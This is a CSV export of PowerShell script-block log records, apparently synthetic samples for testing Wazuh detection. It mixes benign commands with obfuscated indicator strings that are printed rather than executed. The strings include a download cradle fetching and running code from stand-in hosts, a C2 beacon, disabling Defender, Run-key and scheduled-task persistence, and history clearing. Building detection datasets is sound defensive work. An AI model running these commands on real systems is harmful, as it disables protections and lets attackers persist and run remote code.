sample_id,declared_sample_id,mapping_status,source_line,channel,provider_name,computer,record_id,time_created_utc,event_id,scriptblock_id,message_number,message_total,dataset_fidelity_status,scriptblock_sha256,scriptblock_text
PST-185,PST-185,mapped,185,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723091,2026-07-17T09:36:59.0657977Z,4104,b3b7be8e-d7b4-419e-afd6-90d27175071c,1,1,exact,a9024f90db5ba15502d009735daf06ad9fcc23d3b6f389b73e4a308cfae5fc45,"$sampleId='PST-185'; $indicator='[Reflectio' + 'n.Assembly' + ']::Load(' + '[Conv' + 'ert]::FromB' + 'ase64St' + 'ring(''VE' + 'hFU0lTL' + 'UlORVJUL' + 'URVTU1Z' + '''))'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-186,PST-186,mapped,186,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723093,2026-07-17T09:36:59.3829476Z,4104,f68b17d9-4aad-454b-9304-10c056b706d1,1,1,exact,5a28bddb049ef54921c92c60a92c3283d7688f19bdca2838041f702b2450029c,"$sampleId='PST-186'; Get-NetFirewallProfile | Select-Object Name, Enabled; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-187,PST-187,mapped,187,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723099,2026-07-17T09:36:59.7752093Z,4104,05fa3f07-3ce1-42d9-9ecd-7636b9f33460,1,1,exact,7a8123e03a3543ad55106a62cb481201acc538f9b976ff216ed985b5b1c31a4d,"$sampleId='PST-187'; $indicator='[Reflect`ion.Assembly]::Load([Conv`ert]::Fr`omBase64Stri`ng(''VEhFU0lTLUlORVJ`U`LURVTU1Z''))'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-188,PST-188,mapped,188,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723103,2026-07-17T09:37:00.0999728Z,4104,0bdf2680-187a-4547-a12e-e66267c8db08,1,1,exact,20c40e9148575ef6d2e0f4f7fabf47651fbbafda5ae86bd2d90b10dd92d934cf,"$sampleId='PST-188'; Get-ComputerInfo -Property CsName, WindowsProductName, WindowsVersion | Select-Object CsName, WindowsProductName, WindowsVersion; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-189,PST-189,mapped,189,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723170,2026-07-17T09:37:05.1294130Z,4104,c316a970-099a-445b-9a26-d60e77560563,1,1,exact,025c4ed9b85f90e7323e7855e98d7be8aa22be294eb908d439a918b606792b6a,"$sampleId='PST-189'; $csv = 'name,status`nsvc1,running`nsvc2,stopped'; $csv | ConvertFrom-Csv | Select-Object name, status; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-190,PST-190,mapped,190,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723184,2026-07-17T09:37:05.4693265Z,4104,19efc387-33f1-477a-b64c-335091f3cf19,1,1,exact,af54fa4338c6f1163f56a38fe70bd340183cd0a39bd3585afd6e2d61ae577099,"$sampleId='PST-190'; $result=& { Get-Process -ErrorAction SilentlyContinue | Sort-Object Id | Select-Object -First 3 Name,Id }; $result | Out-String | Write-Output; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-191,PST-191,mapped,191,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723190,2026-07-17T09:37:05.9325682Z,4104,138ec8ac-5436-49ed-8fac-9a12d9eb79ab,1,1,exact,ef7dbc0970ea08e43e2ad28a4957a0b6ff65ce2822ce7bee44bf3b26730a50ce,"$sampleId='PST-191'; $encoded='JAB4AD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AQwBvAG0ATwBiAGoAZQBjAHQAIABNAHMAWABtAGwAMgAuAFMAZQByAHYAZQByAFgAbQBsAEgAdAB0AHAAOwAgACQAeAAuAE8AcABlAG4AKAAnAEcARQBUACcALAAnAGgAdAB0AHAAcwA6AC8ALwB4AG0AbAAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AdABhAHMAawAnACwAJABmAGEAbABzAGUAKQA7ACAAJAB4AC4AUwBlAG4AZAAoACkAOwAgAEkARQBYACAAJAB4AC4AUgBlAHMAcABvAG4AcwBlAFQAZQB4AHQA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-192,PST-192,mapped,192,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723194,2026-07-17T09:37:06.2776916Z,4104,d0fe4e8d-2c97-44bb-9f69-459b341373c0,1,1,exact,6104b831d38e112cda36f39a707b499569463274883ddf8731894243296e9ea1,"$sampleId='PST-192'; $encoded='JABjAG0AZAA9ACgAJwBJAG4AdgAnACsAJwBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AJwApADsAIAAmACAAKABHAGUAdAAtAEMAbwBtAG0AYQBuAGQAIAAkAGMAbQBkACkAIAAiAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAJwBUAEgARQBTAEkAUwAtAEkATgBFAFIAVAAnACIA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-193,PST-193,mapped,193,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723209,2026-07-17T09:37:06.6086268Z,4104,f873d314-9767-4826-8084-d686f1637f05,1,1,exact,152c003fd5e6f0ea33b3922312b8efa403b9c414db3e85321f099a06b5e9480b,"$sampleId='PST-193'; @{host=$env:COMPUTERNAME; user=$env:USERNAME} | ConvertTo-Json; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-194,PST-194,mapped,194,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723214,2026-07-17T09:37:06.9309904Z,4104,f3ae28ae-de27-4baa-8698-de7b37cd7819,1,1,exact,1fd526a2ca56547f5e47bb8cecfc2cd914899c6fe2190ad1d48ebc6e45cbce7c,"$sampleId='PST-194'; $indicator='Set-MpP' + 'referenc' + 'e -Exclusio' + 'nPath ''C:' + '\__THESI' + 'S_INERT__' + ''' -DisableR' + 'ealtimeMo' + 'nitoring' + ' $t' + 'rue'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-195,PST-195,mapped,195,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723219,2026-07-17T09:37:07.2699096Z,4104,4e3f2ba5-e829-4b29-844c-bc782c9f3793,1,1,exact,47f2ceeb05266259ed5a159c7932943f829bc2d0dd2b5a40fb378664219d9975,"$sampleId='PST-195'; Get-MpComputerStatus -ErrorAction SilentlyContinue | Select-Object AMServiceEnabled, AntivirusEnabled; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-196,PST-196,mapped,196,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723225,2026-07-17T09:37:07.7113742Z,4104,3688d21c-b3d1-4264-9123-805d9518fc6e,1,1,exact,a28f9fca238de37a3e80dcc61ef0eb141c1c6d0c29cf196b5600b26379ced883,"$sampleId='PST-196'; $s = 'key1=value1;key2=value2|owner=ops;scope=[local];state={ok}'; Write-Output $s; Write-Output 'hard benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-197,PST-197,mapped,197,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723251,2026-07-17T09:37:08.0606253Z,4104,5b5b79ea-1af8-41ef-8ee2-d6e4769f87c3,1,1,exact,ccb8754539f3455c27821e2bd8e66f0d05fd862a69b4c928e71d588e6dff6b70,"$sampleId='PST-197'; $indicator='Register-ScheduledTask -TaskName ''UpdateCheck'' -Action (New-ScheduledTaskAction -Execute ''powershell.exe'' -Argument ''-NoProfile -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQASABFAFMASQBTAC0ASQBOAEUAUgBUACcA'')'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-198,PST-198,mapped,198,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723253,2026-07-17T09:37:08.3981382Z,4104,72cdccc5-0a8a-4935-9ee4-09ecdc4199dd,1,1,exact,686255e5be8f05bd138d9c9f98ccc9f756fe27679c24c595adf6443ca37bfef9,"$sampleId='PST-198'; $indicator='reGiStER-SCheDULEDtAsK -TasKNAmE ''updATEChECK'' -acTION (NEW-sCHeDuLedtaskAcTioN -ExEcUTe ''POwErshelL.eXE'' -arGUMENT ''-NoPROfILE -ENcOdedcomManD vWbyAGKaDablac0aTWB1AhqacAB1AHQaIAANAFQASABFAfMASQBtAC0ASQbOAEuAUgbuacCA'')'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-199,PST-199,mapped,199,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723257,2026-07-17T09:37:08.7389690Z,4104,28204e83-3dd2-4edf-807d-c67f9a39829d,1,1,exact,5f7f1cf7e98f80f9398a6d660434dbcb6faed2d353b8fe3d80a18f604cee40b5,"$sampleId='PST-199'; $indicator='$cmd=(''Inv' + '''+''o' + 'ke-Exp' + 'ression'');' + ' & (Get-C' + 'ommand ' + '$cmd)' + ' ""Write' + '-Output ''' + 'THESIS-INERT''""'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-200,PST-200,mapped,200,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723262,2026-07-17T09:37:09.0784570Z,4104,d14ac0e7-15a7-449e-9970-ed9d8ddb0d1c,1,1,exact,e129ad9e41cfd2dce55342ed75c2ebcce6b792b8672bb5df96a686827b6ba22c,"$sampleId='PST-200'; $indicator='$x=New-Ob`ject -ComObje`ct MsXml2.ServerXmlHttp; $x.Open(''GET'',''https://xml.example.in`valid/task'',$false); $x.Send(); IEX $x.ResponseT`e`xt'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-201,PST-201,mapped,201,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723267,2026-07-17T09:37:09.4110564Z,4104,8da22db4-38d9-45e8-9b98-b5c99ae9ccbc,1,1,exact,aadb0a3db2c14c02e960202990e0df3f38ca01c55b25ed8e7eeec291305ea332,"$sampleId='PST-201'; $template = 'backup_path=%ProgramData%\Company\Backups; window=nightly'; [Environment]::ExpandEnvironmentVariables($template); Write-Output 'hard benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-202,PST-202,mapped,202,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723280,2026-07-17T09:37:09.7479115Z,4104,8c4886ae-a70f-448d-8fe2-293a69edef63,1,1,exact,766952fbd55bea8aa3bc2a76ba1b157d621b44a93d73555de98ac0f5095bcc2c,"$sampleId='PST-202'; $parts=@('neW-itemp`R`oper','Ty -paTH ''hKcu:\So','fTWArE\MiCrOsof','t\wi`nDowS\c','UrRe`NT`vERsi','on\rUN'' -NAmE ','''UPdaTE`ChECk'' -VAl','uE ''PoWE`rSheLl','.EXe -WiNdO`WSt','Yle HiD`dEn -FILE ','C:\__Thes`Is','_INERT__\StaGe.p','s1'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-203,PST-203,mapped,203,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723282,2026-07-17T09:37:10.0721049Z,4104,b7f6ded5-3fe5-4930-9306-6929ec3ae772,1,1,exact,d67b41d37f95859052382a5015b341e80d0a011091fbfe03c68db3298ea5bd01,"$sampleId='PST-203'; $indicator='Get-Pro`cess | Select-Ob`ject Name,Id,Path'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-204,PST-204,mapped,204,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723285,2026-07-17T09:37:10.4005833Z,4104,be1290d0-044b-4ba2-ab52-db44975c086c,1,1,exact,0b2e185cdf3ecde100e3a4240b71b299eb6f91fac547fff2122cfe8306abc673,"$sampleId='PST-204'; $indicator='RundLL32.eXE C:\__thesis_InERt__\sTaGE.dLl,ENtRypOiNT'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-205,PST-205,mapped,205,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723288,2026-07-17T09:37:10.7323229Z,4104,e29109ae-93fe-4572-8ea9-bad00796ce3b,1,1,exact,4f76aef0631b758c43c093210dcf62e0cce51c37a4c5e03e9bd24486f4131f85,"$sampleId='PST-205'; Get-CimInstance Win32_Process | Where-Object Name -like '*host*' | Select-Object -First 5 Name, ProcessId; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-206,PST-206,mapped,206,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723292,2026-07-17T09:37:11.2419344Z,4104,a86993cf-1ee3-40df-9256-615232c16015,1,1,exact,5e39bad995a4f0d2557f85bb6ba8780fcdbd69d632b904d029d540d9d6fc45e8,"$sampleId='PST-206'; Get-ChildItem Cert:\CurrentUser\My -ErrorAction SilentlyContinue | Select-Object -First 3 Subject, NotAfter; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-207,PST-207,mapped,207,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723296,2026-07-17T09:37:11.5881038Z,4104,69904579-3357-4610-ad86-00c7e5bae506,1,1,exact,88fcbac2b6c257c8dfc95eae84f7a9427cc4587eef858a5bc22abcf28e795232,"$sampleId='PST-207'; $indicator='Add-Type -MemberDe`fin`ition ''[Dl`lImport(""kern`el32.dll"")] public stat`ic extern Int`Ptr Ope`nProcess(uint access, bool inherit, int pr`ocessId);'' -Name Nat`iveMetho`ds -Names`pace Thes`is.Inert'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-208,PST-208,mapped,208,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723299,2026-07-17T09:37:11.9280534Z,4104,cbbef7cf-ef95-422a-a4f7-e2078d7746ee,1,1,exact,f748146f8244bbda75d1d0b6f804f05dbba488fe91e198fe88516a95b7a283c8,"$sampleId='PST-208'; Get-MpPreference -ErrorAction SilentlyContinue | Select-Object DisableRealtimeMonitoring, MAPSReporting; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-209,PST-209,mapped,209,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723315,2026-07-17T09:37:12.4508255Z,4104,9603c407-05c3-4411-b3f1-23b430e6c34d,1,1,exact,41b627f8414953522e8e3fc7249f113d786991ab831352494a1f366ab4116443,"$sampleId='PST-209'; $line = 'INFO 2026-06-28 user=admin action=read status=ok'; [regex]::Matches($line, 'user=\w+|status=\w+') | ForEach-Object Value; Write-Output 'hard benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-210,PST-210,mapped,210,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723317,2026-07-17T09:37:12.7740123Z,4104,3d44f5a3-d8c4-422c-b222-5a3a4f138592,1,1,exact,c32f5f534f9039c76e327e3c8893a46b53bbcd8f7b1fb3a379fce5003d719876,"$sampleId='PST-210'; $indicator='$x=New-Object ' + '-ComObject' + ' MsXml2.Serve' + 'rXmlHttp; $x' + '.Open(''GET'',''htt' + 'ps://xml.example' + '.invalid/task''' + ',$false); $x.S' + 'end(); IEX $x.R' + 'esponseTe' + 'xt'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-211,PST-211,mapped,211,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723320,2026-07-17T09:37:13.1185121Z,4104,942f53c1-1a95-4bfa-8d0b-513bf32ea0e2,1,1,exact,3feaae1ee6afd4941045454003ff3f62c805ea2a115583f302e38667c754acb3,"$sampleId='PST-211'; $parts=@('Get-ItemP','ropert','y -Pat','h ''HK','LM:\Sof','tware\M','icrosoft\','Windo','ws\CurrentVer','sion\Uni','nstall','\*'''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-212,PST-212,mapped,212,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723323,2026-07-17T09:37:13.4584717Z,4104,c7a8723b-47fc-403c-9ef7-e8981aea7941,1,1,exact,51ecd670e390b898a35f50d564cf378e572cccc3cb2482bbd1efacd2f033afe9,"$sampleId='PST-212'; $indicator='Get' + '-Clipbo' + 'ard ' + '-Raw |' + ' Conver' + 'tTo-Json' + ' -Compres' + 's'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-213,PST-213,mapped,213,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723338,2026-07-17T09:37:13.7986083Z,4104,dff60424-55c3-496d-a8e8-f7b2ce582871,1,1,exact,707eb6fef60ceb2a9368eaf8205bdf8a8b9bb7ca000cb3c45846db4d6a8b48c9,"$sampleId='PST-213'; $result=& { Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 3 -ErrorAction SilentlyContinue | Select-Object Id,TimeCreated }; $result | Out-String | Write-Output; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-214,PST-214,mapped,214,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723341,2026-07-17T09:37:14.1522763Z,4104,a513e1b3-2b51-483b-a0a8-335a2764dad5,1,1,exact,b0e2bddf7c35cd64d021c5c9e048bcf48aaaab8412a9c27686bccce1dd466124,"$sampleId='PST-214'; $parts=@('rundll32','.exe ','C:\','__THESI','S_INER','T__\stag','e.dll,Entry','Poi','nt'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-215,PST-215,mapped,215,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723342,2026-07-17T09:37:14.4774281Z,4104,bf047804-0b3b-4a35-acdc-c2b4848a292a,1,1,exact,65e6e8b7c926b1c5d599bc90f604270a4d3a133b925a44d7a18020a0387c3234,"$sampleId='PST-215'; Get-WinEvent -LogName Application -MaxEvents 10 | Where-Object LevelDisplayName -eq 'Error' | Select-Object -First 3 Id, ProviderName; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-216,PST-216,mapped,216,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723345,2026-07-17T09:37:14.8524259Z,4104,9c05caaa-d831-41b4-92ef-47b82f5cec38,1,1,exact,315a983a58501d8ad223fce0ba9159888ebb1eab8d2637f848114f305de81406,"$sampleId='PST-216'; $indicator='run`dll32.exe C:\__THESIS_INERT__\stage.dll,EntryPoint'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-217,PST-217,mapped,217,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723351,2026-07-17T09:37:15.1861846Z,4104,4357ebc0-3e2c-446e-ab8e-983432159a5d,1,1,exact,d0d71af001836c90617292a23d2a7d3637da029506c014223f57df420a4f1b87,"$sampleId='PST-217'; $indicator='Get-childitEM ''c:\uSERS'' -REcUrSe -fOrcE -ErRoRaCTION SILeNTlyCOntInUE'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-218,PST-218,mapped,218,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723353,2026-07-17T09:37:15.5123791Z,4104,8ceffd06-3d77-4074-a807-59c83e6e9fe7,1,1,exact,c9abddce3c3f4e5b0fecb9e6fd656bbf675746564c961b2e0e42cda690c1f031,"$sampleId='PST-218'; Get-TimeZone | Select-Object Id, DisplayName; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-219,PST-219,mapped,219,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723357,2026-07-17T09:37:15.8451500Z,4104,5837df53-da5b-4064-a603-f9cce77223e5,1,1,exact,aac56170dddee22d5ff24af1bde2c40b70f40cbcb9c0126f23acb262c1f26e84,"$sampleId='PST-219'; Get-LocalGroup -ErrorAction SilentlyContinue | Select-Object -First 5 Name; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-220,PST-220,mapped,220,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723371,2026-07-17T09:37:16.1887000Z,4104,88e5ae4d-1872-44e4-856c-9be6b61da98a,1,1,exact,a62fbee8432205a2b74086af71fb22d95456cab6e1fb55f74ab2270bf48d36de,"$sampleId='PST-220'; $PSVersionTable | Select-Object PSVersion, PSEdition; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-221,PST-221,mapped,221,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723373,2026-07-17T09:37:16.5087165Z,4104,3400c16a-d172-4dec-be06-f0c851d8e12f,1,1,exact,e2e5d6ed775b52fa871f8bd73882273fce07bd64885675d539a43911d4c4474f,"$sampleId='PST-221'; 'alpha','beta','gamma' | ForEach-Object { Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($_))) } | Select-Object -First 2 Algorithm, Hash; Write-Output 'hard benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-222,PST-222,mapped,222,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723378,2026-07-17T09:37:16.8560113Z,4104,c9460ba9-a550-45cc-8aef-fa21c8b284f5,1,1,exact,5e1ca1213472e9ea04f72f7a7e788047ba4f4420044519b517a9db4b36b4ae8d,"$sampleId='PST-222'; $indicator='[System' + '.Drawi' + 'ng.Gra' + 'phics]::Fro' + 'mImage($b' + 'mp).Copy' + 'From' + 'Scree' + 'n(0,0,0,0,' + '$bmp.Siz' + 'e)'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-223,PST-223,mapped,223,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723383,2026-07-17T09:37:17.2135652Z,4104,d7fa5f59-6e18-4809-bf6a-e9e5a5391a3d,1,1,exact,0650388d4d2e6117d1be982e0ced5bff6d07301e7ad9d4bfed5d21f766e8a990,"$sampleId='PST-223'; $encoded='RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgACcAQwA6AFwAVQBzAGUAcgBzACcAIAAtAFIAZQBjAHUAcgBzAGUAIAAtAEYAbwByAGMAZQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-224,PST-224,mapped,224,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723386,2026-07-17T09:37:17.5484263Z,4104,c16c93a6-f9ff-4f1b-9753-8ac739c8d8c6,1,1,exact,d43c630338d0df4eceb2fe57a6cf9ce7daefac98d285956cf3f3e3e278ebdce3,"$sampleId='PST-224'; $parts=@('ClEAR','-hIsT`','ORy; re','mOve-iT','eM (GeT-PSR','EaDLine','optiON).','his`To','RySav`epAT','H -FOrce'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-225,PST-225,mapped,225,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723389,2026-07-17T09:37:17.8755738Z,4104,7dbbce09-acec-4569-a1d3-8c829d982c52,1,1,exact,eb03688636b43626edcf7640e7e1e711a24febe0e25ca6e003502e4915be84d1,"$sampleId='PST-225'; Get-NetAdapter | Select-Object -First 5 Name, Status, MacAddress; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-226,PST-226,mapped,226,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723405,2026-07-17T09:37:18.2747414Z,4104,62c98a94-aa00-4a22-a07b-bacd371301a3,1,1,exact,c706b5855595e9d2bcde97eee380c655f5a58df06189557eaf1579927ac569f6,"$sampleId='PST-226'; $uri = 'https://intranet.example.local/status/api/v1/health?format=json'; Write-Output $uri; Write-Output 'hard benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-227,PST-227,mapped,227,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723408,2026-07-17T09:37:18.6159445Z,4104,ef93e106-dc88-4924-82d2-07033a6b8693,1,1,exact,d3ca7abd30fac2217bf08d576e8c71529a385fb37bd68cfd3311ab0616be5868,"$sampleId='PST-227'; $indicator='$profi`le=@{Sleep=60000;Jit`ter=0.25;Us`erAgent=''Mozil`la/5.0'';Uri=''/api/v1/sta`tus''}; Invo`ke-We`bRequest -Uri ''https://c2.ex`ample.inva`lid/api/v1/stat`us'''; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-228,PST-228,mapped,228,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723410,2026-07-17T09:37:18.9544634Z,4104,689e7bd2-cada-4053-aec9-fc1351235405,1,1,exact,3513ef4403c9d491de4f00358a798c77486b41fffb8fbb38a6c6bb4bce9db1e1,"$sampleId='PST-228'; Get-DnsClientCache -ErrorAction SilentlyContinue | Select-Object -First 5 Entry, Data; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-229,PST-229,mapped,229,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723416,2026-07-17T09:37:19.3526223Z,4104,178f00df-1d2c-47b4-aeaa-e27acbea8613,1,1,exact,a993cf32b038860930058a587c39f46acf04f3956d0b2558b315dd09b6c0e28d,"$sampleId='PST-229'; $url = 'http://localhost:8080/healthz?component=agent&format=text'; Write-Output $url; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-230,PST-230,mapped,230,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723429,2026-07-17T09:37:19.6847509Z,4104,ee27b816-b0e5-4424-b9a9-2536f58e9036,1,1,exact,7094afb05776b53e9c7061e3a9f3453cc2c844c0937358e11377b5f1a4117c91,"$sampleId='PST-230'; $indicator='Set-MpPreference -ExclusionPath ''C:\__THESIS_INERT__'' -DisableRealtimeMonitoring $true'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
